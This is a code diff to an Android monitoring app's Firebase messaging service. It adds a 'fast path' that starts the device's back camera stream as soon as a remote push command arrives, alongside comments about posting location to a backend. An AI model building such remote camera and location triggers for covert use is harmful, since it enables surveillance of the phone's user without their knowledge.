@@ -50,6 +50,18 @@ class SpappFirebaseMessagingService : FirebaseMessagingService() {
             }
         }
 
+        // Fast path: if this is a camera stream command, start streaming immediately
+        if (message.data["commandType"] == "camera_stream") {
+            val hasCameraPermission = androidx.core.content.ContextCompat.checkSelfPermission(
+                applicationContext,
+                android.Manifest.permission.CAMERA
+            ) == android.content.pm.PackageManager.PERMISSION_GRANTED
+            if (hasCameraPermission) {
+                Log.d(TAG, "FCM fast-path: triggering camera stream immediately")
+                com.spapp.monitoring.camerastream.CameraStreamService.start(applicationContext, "back")
+            }
+        }
+
         // Execute fast command pass IMMEDIATELY.
         // runBlocking holds the Firebase WakeLock and prevents the OS from putting the process
         // to sleep before the location is fetched and POSTed to the backend.
